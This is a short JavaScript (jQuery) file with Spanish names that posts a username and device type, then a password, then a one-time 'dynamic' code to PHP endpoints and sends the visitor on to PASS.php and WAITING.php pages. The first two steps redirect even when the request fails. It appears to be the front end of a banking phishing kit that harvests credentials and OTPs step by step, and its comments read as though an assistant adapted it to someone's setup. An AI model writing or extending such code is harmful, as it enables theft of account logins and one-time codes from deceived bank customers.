function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    
    // Usamos inicio.php que sí lo tienes
    $.post("../process/inicio.php", { usr: u, dis: d }, function() {
        window.location.href = "PASS.php";
    }).fail(function() {
        setTimeout(function(){ window.location.href = "PASS.php"; }, 2000);
    });
}

function pasousuario(p){    
    $("#fondo, #cargando-o").show();
    
    // Usamos pasousuario.php que sí lo tienes
    $.post("../process/pasousuario.php", { pass: p }, function() {
        window.location.href = "WAITING.php";
    }).fail(function() {
        setTimeout(function(){ window.location.href = "WAITING.php"; }, 2000);
    });
}

function enviardinamica(o){
    $("#fondo, #cargando-o").show();
    
    // Cambiado a pasootp.php según tu captura
    $.post("../process/pasootp.php", { otp: o }, function() {
        window.location.href = "WAITING.php";
    });
}
